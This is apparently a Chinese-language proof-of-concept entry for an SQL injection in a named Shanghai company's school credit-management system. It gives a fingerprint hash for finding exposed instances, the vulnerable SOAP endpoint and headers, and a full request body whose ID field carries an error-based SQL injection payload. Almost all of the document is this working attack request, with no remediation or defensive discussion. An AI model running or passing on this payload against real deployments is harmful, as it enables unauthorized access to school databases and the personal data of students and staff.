# 上海鹏达计算机系统开发有限公司学分制系统存在SQL注入漏洞

- **系统**：上海鹏达计算机系统开发有限公司学分制系统　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`icon_hash="-1632820573"`
- **请求**：`POST /WebService_PantoSchool.asmx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=e5l5acb3exqi5bmtezazrjsg`　`Priority: u=1`　`SOAPAction: [http://tempuri.org/GetCalendarContentById](http://tempuri.org/GetCalendarContentById)`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 314`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:GetCalendarContentById>
<!--type: string-->
<tem:ID>-7793' OR 7994 IN (SELECT (CHAR(113)+CHAR(122)+CHAR(120)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (7994=7994) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(112)+CHAR(106)+CHAR(113))) AND 'qciT'='qciT</tem:ID>
</tem:GetCalendarContentById>
</soapenv:Body>
</soapenv:Envelope>
```